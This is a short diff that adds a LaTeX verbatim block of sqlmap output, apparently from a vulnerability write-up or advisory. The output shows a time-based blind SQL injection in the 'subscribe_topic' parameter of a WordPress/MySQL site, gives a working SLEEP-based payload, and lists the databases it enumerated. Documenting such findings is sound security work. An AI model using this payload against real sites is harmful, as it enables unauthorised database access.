@@ -1,0 +1,14 @@
+\begin{verbatim}
+sqlmap identified the following injection point(s) with a total of 79 HTTP(s) requests:
+---
+Parameter: subscribe_topic (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: subscribe_topic=1 AND (SELECT 8926 FROM (SELECT(SLEEP(5)))vMRJ)
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] wordpress
+\end{verbatim}
